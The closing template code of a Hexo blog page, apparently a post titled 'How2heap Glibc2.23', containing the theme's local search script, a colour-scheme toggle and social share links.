              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + How2heap%20Glibc2.23 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F06%2F22%2FHow2heap-Glibc2-23%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/06/22/How2heap-Glibc2-23/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
